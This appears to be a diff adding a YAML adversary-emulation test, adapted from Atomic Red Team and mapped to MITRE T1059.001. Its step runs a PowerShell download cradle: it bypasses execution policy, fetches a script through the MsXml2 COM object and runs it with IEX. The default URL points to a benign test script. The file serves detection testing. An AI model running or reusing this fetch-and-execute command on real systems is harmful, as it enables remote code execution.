@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Powershell MsXml COM object - with prompt
+description: |
+    Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.
+
+    Provided by https://github.com/mgreen27/mgreen27.github.io
+args:
+    - name: url
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
+uuid: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1059: Command and Scripting Interpreter'
+    subtechniques:
+        - 'T1059.001: PowerShell'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: powershell-msxml-com-object---with-prompt
+      inline: |
+        powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','{{.Args.url}}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
